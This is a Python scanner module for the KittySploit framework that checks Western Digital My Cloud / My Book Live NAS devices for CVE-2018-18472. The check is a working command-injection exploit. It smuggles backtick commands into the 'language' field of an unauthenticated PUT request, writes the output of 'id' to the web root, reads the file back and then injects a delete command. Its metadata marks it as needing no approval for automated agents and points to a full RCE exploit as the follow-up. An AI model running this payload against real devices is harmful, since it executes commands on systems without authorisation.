#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Western Digital My Cloud / My Book Live language_configuration RCE (CVE-2018-18472)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WD NAS - language_configuration RCE Detection (CVE-2018-18472)',
        'description': (
            'Detects CVE-2018-18472 by injecting id via PUT /api/1.0/rest/language_configuration '
            'backticks and fetching the written output file.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2018', 'western-digital', 'nas', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['exploits/linux/http/wd_nas_cve_2018_18472_rce'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2018-18472',
        ],
        'cve': 'CVE-2018-18472',
    }

    def run(self):
        fname = self.random_text(10) + '.txt'
        api = '/api/1.0/rest/language_configuration'
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        data = f'language=en_US`id > /var/www/{fname}`'
        self.http_request(method='PUT', path=api, data=data, headers=headers, allow_redirects=False)
        r = self.http_request(method='GET', path='/' + fname, allow_redirects=False)
        # cleanup
        cleanup = f'language=en_US`rm -f /var/www/{fname}`'
        self.http_request(method='PUT', path=api, data=cleanup, headers=headers, allow_redirects=False)
        if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
            self.set_info(
                severity='critical',
                reason='WD NAS language_configuration RCE (CVE-2018-18472)',
                path=api,
            )
            return True
        return False
